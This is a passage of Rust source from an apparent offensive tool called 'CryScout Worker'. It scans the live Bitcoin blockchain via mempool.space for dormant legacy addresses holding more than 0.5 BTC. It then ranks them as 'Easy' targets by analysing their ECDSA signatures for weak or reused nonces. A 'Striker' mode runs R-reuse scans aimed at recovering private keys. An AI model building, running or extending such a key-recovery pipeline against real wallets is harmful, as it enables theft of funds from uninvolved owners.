                                                        ).unwrap_or(true);
                                                        if !exists {
                                                            time::sleep(Duration::from_millis(1000)).await;
                                                            let bal_url = format!("https://mempool.space/api/address/{}", addr);
                                                            if let Ok(bal_r) = client.get(&bal_url).send().await {
                                                                if let Ok(bal_json) = bal_r.json::<Value>().await {
                                                                    let funded = bal_json["chain_stats"]["funded_txo_sum"].as_u64().unwrap_or(0);
                                                                    let spent = bal_json["chain_stats"]["spent_txo_sum"].as_u64().unwrap_or(0);
                                                                    let tx_count = bal_json["chain_stats"]["tx_count"].as_u64().unwrap_or(0);
                                                                    let balance_sat = funded.saturating_sub(spent);
                                                                    let balance_btc = balance_sat as f64 / 100_000_000.0;

                                                                    if balance_btc > 0.5 && tx_count >= 2 {
                                                                        let _ = conn.execute(
                                                                            "INSERT OR IGNORE INTO addresses (address, balance, status, potential_weakness, sigs_fetched, analyzed, vulnerability_score, transactions) VALUES (?1, ?2, 'Dormant', 'None Identified', 0, 0, 0.0, ?3)",
                                                                            params![addr, balance_btc, tx_count],
                                                                        );
                                                                        hv_count += 1;
                                                                        state.log(&format!("  [+] Found: {} ({:.4} BTC, {} txs)", addr, balance_btc, tx_count));
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        if hv_count > 0 {
            state.log(&format!("Discovered {} new high-value legacy addresses.", hv_count));
        } else {
            state.log("No new high-value addresses found this cycle.");
        }
    }

    Ok(())
}
async fn run_analyzer(state: &mut WorkerState) -> Result<()> {
    let conn = Connection::open(DB_FILE)?;
    conn.pragma_update(None, "busy_timeout", &30000)?;

    // Reset previously-struck addresses that had too few sigs for meaningful analysis,
    // but ONLY if they haven't been fully fetched yet (sigs_fetched = 0), meaning new
    // signatures might still arrive. Without this guard, addresses with <10 sigs whose
    // fetch is complete would be reset and re-struck in an infinite loop.
    let reset_count: i64 = conn.query_row(
        "SELECT COUNT(*) FROM addresses a
         WHERE a.balance > 0 AND a.sigs_scanned = 1 AND a.vulnerability_score > 0
         AND a.sigs_fetched = 0
         AND (SELECT COUNT(*) FROM signatures s WHERE s.address = a.address) < 10",
        [], |r| r.get(0)
    ).unwrap_or(0);
    if reset_count > 0 {
        conn.execute(
            "UPDATE addresses SET sigs_scanned = 0, analyzed = 0
             WHERE balance > 0 AND sigs_scanned = 1 AND vulnerability_score > 0
             AND sigs_fetched = 0
             AND (SELECT COUNT(*) FROM signatures s WHERE s.address = addresses.address) < 10",
            [],
        )?;
        state.log(&format!("Reset {} low-sig addresses for re-analysis and re-strike.", reset_count));
    }

    // Also clear stale vulnerability records that were based on too few sigs
    let _ = conn.execute(
        "DELETE FROM vulnerabilities WHERE type = 'Statistical Anomaly' AND address IN (
            SELECT a.address FROM addresses a
            LEFT JOIN (SELECT address, COUNT(*) as cnt FROM signatures GROUP BY address) s ON a.address = s.address
            WHERE COALESCE(s.cnt, 0) < 10
        )",
        [],
    );

    // Only analyze addresses that have balance, signatures, and need analysis
    let mut stmt = conn.prepare(
        "SELECT a.address
         FROM addresses a
         WHERE a.balance > 0
           AND (a.analyzed = 0 OR a.analyzed IS NULL)
           AND a.sigs_fetched = 1
           AND EXISTS (SELECT 1 FROM signatures s WHERE s.address = a.address)
         ORDER BY a.vulnerability_score DESC
         LIMIT 5"
    )?;
    let addresses: Vec<String> = stmt
        .query_map([], |row| row.get(0))?
        .flatten()
        .collect();
    
    if addresses.is_empty() {
        return Ok(());
    }

    state.log(&format!("Analyzer found {} addresses to process.", addresses.len()));

    for addr in addresses {
        state.throttle_if_needed().await;
        state.log(&format!("Analyzer processing: {}", addr));
        let mut sig_stmt = conn.prepare("SELECT r_int, s_int, timestamp FROM signatures WHERE address = ?1")?;
        let sigs: Vec<features::SigData> = sig_stmt.query_map(params![&addr], |r| {
            let r_str: String = r.get(0)?;
            let s_str: String = r.get(1)?;
            let t: Option<u64> = r.get(2)?;
            Ok(features::SigData {
                r: BigInt::from_str_radix(&r_str, 10).unwrap_or_default(),
                s: BigInt::from_str_radix(&s_str, 10).unwrap_or_default(),
                timestamp: t,
            })
        })?.collect::<rusqlite::Result<Vec<_>>>()?;

        if sigs.is_empty() {
            state.log(&format!("Analyzer: No signatures in DB for {}", addr));
            conn.execute(
                "UPDATE addresses
                 SET vulnerability_score = 0,
                     potential_weakness = 'No signature data available',
                     rank = NULL,
                     analyzed = 1,
                     analyzed_at = datetime('now')
                 WHERE address = ?1",
                params![&addr],
            )?;
            continue;
        }

        if sigs.len() < MIN_SIGNATURES_FOR_SCORING {
            state.log(&format!(
                "Analyzer: Only {} signature(s) available for {}. Clearing score until more evidence exists.",
                sigs.len(),
                addr
            ));
            conn.execute(
                "UPDATE addresses
                 SET vulnerability_score = 0,
                     potential_weakness = 'Insufficient signature data',
                     rank = NULL,
                     analyzed = 1,
                     analyzed_at = datetime('now')
                 WHERE address = ?1",
                params![&addr],
            )?;
            continue;
        }

        state.log(&format!("Analyzer: Found {} signatures for {}", sigs.len(), addr));

        if let Some(f) = features::ScoringFeatures::extract(&sigs) {
            state.log(&format!("Analyzer: Extracted features for {}. Scoring...", addr));
            // Base score components (cryptographic evidence of weakness)
            let mut score = (1.0 - f.r_entropy) * 1.5   // High entropy loss is critical
                      + f.lsb_bias * 2.0                // Predictable low bits are easy lattice targets
                      + f.fft_peak_score * 1.0          // Periodic patterns
                      + f.correlation_score.abs() * 1.0; // Time-nonce coupling

            // Significant boost for "Known Broken" implementations
            // Only apply when we have enough signatures for statistical confidence
            if f.num_signatures >= 20 &&
               (f.wallet_fingerprint.contains("Android") ||
                f.wallet_fingerprint.contains("OpenSSL") ||
                f.wallet_fingerprint.contains("Low Entropy") ||
                f.wallet_fingerprint.contains("Sequential")) {
                score += 5.0; // Mark as priority 'Easy' target
            } else if f.num_signatures >= 5 &&
               (f.wallet_fingerprint.contains("Android") ||
                f.wallet_fingerprint.contains("OpenSSL") ||
                f.wallet_fingerprint.contains("Low Entropy") ||
                f.wallet_fingerprint.contains("Sequential")) {
                score += 1.5; // Tentative boost, needs more sigs to confirm
            }
            
            // Signature density boost (more data = higher solve probability)
            let data_boost = (f.num_signatures as f64 / 50.0).min(1.0);
            score += data_boost;

            // Metadata-based "Easy Target" Boosts (Era & Dormancy)
            let meta: (Option<String>, Option<String>, Option<f64>) = conn.query_row(
                "SELECT first_seen, last_seen, balance FROM addresses WHERE address = ?1",
                params![&addr],
                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?))
            ).unwrap_or((None, None, None));

            if let Some(fs) = meta.0 {
                // Focus on 2009-2012: The Golden Age of weak PRNGs
                if fs.contains("2009") || fs.contains("2010") { score += 3.0; }
                else if fs.contains("2011") || fs.contains("2012") { score += 2.0; }
                else if fs.contains("2013") || fs.contains("2014") { score += 0.5; }
            }

            conn.execute(
                "UPDATE addresses SET vulnerability_score = ?1, potential_weakness = ?2, analyzed = 1, analyzed_at = datetime('now') WHERE address = ?3",
                params![score, f.wallet_fingerprint, addr],
            )?;
        }
        // Mandatory yield between addresses to prevent CPU monopolization
        time::sleep(Duration::from_millis(500)).await;
    }

    // Update ranks based on score (Dense Rank)
    state.log("Updating global ranks...");
    let _ = conn.execute(
        "UPDATE addresses SET rank = (
            SELECT (SELECT COUNT(DISTINCT vulnerability_score) FROM addresses a2 WHERE a2.vulnerability_score > addresses.vulnerability_score) + 1
        ) WHERE vulnerability_score > 0",
        [],
    );

    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let cli = Cli::parse();
    let task_name = format!("{:?}", cli.command);
    let mut state = WorkerState::new(task_name.clone());
    state.log(&format!("CryScout Worker v3.2 (Rust Native) started. Mode: {}", state.task));
    
    // Spawn heartbeat task
    let worker_id = state.worker_id.clone();
    let task = state.task.clone();
    tokio::spawn(async move {
        let mut sys = System::new_all();
        let conn = match Connection::open(DB_FILE) {
            Ok(c) => c,
            Err(_) => return,
        };
        let mut interval = time::interval(Duration::from_secs(60));
        loop {
            interval.tick().await;
            sys.refresh_cpu_usage();
            sys.refresh_memory();
            let cpu = sys.global_cpu_info().cpu_usage() as f64;
            let ram = sys.used_memory() as f64 / 1024.0 / 1024.0;
            let _ = conn.execute(
                "INSERT OR REPLACE INTO worker_status (worker_id, task, cpu_usage, ram_usage, last_heartbeat)
                 VALUES (?1, ?2, ?3, ?4, datetime('now'))",
                params![worker_id, task, cpu, ram],
            );
        }
    });

    loop {
        // Adaptive pacing: throttle before each cycle if system is loaded
        state.throttle_if_needed().await;
        match cli.command {
            Commands::Scanner => { let _ = run_scanner(&mut state).await; }
            Commands::Analyzer => { let _ = run_analyzer(&mut state).await; }
            Commands::Striker => {
                // Run cross-address R-reuse scan before per-target strikes
                if let Err(e) = run_cross_address_reuse_scan(&mut state).await {
                    state.log(&format!("Cross-R scan error: {}", e));
                }

                match run_striker(&mut state).await {
                    Ok(found) => {
                        if !found {
                            state.log("No targets found for strike. Waiting...");
                        }
                    }
                    Err(e) => state.log(&format!("Striker error: {}", e)),
                }
            }
            _ => {}
        }
        // Base interval between cycles
        time::sleep(Duration::from_secs(30)).await;
    }
}
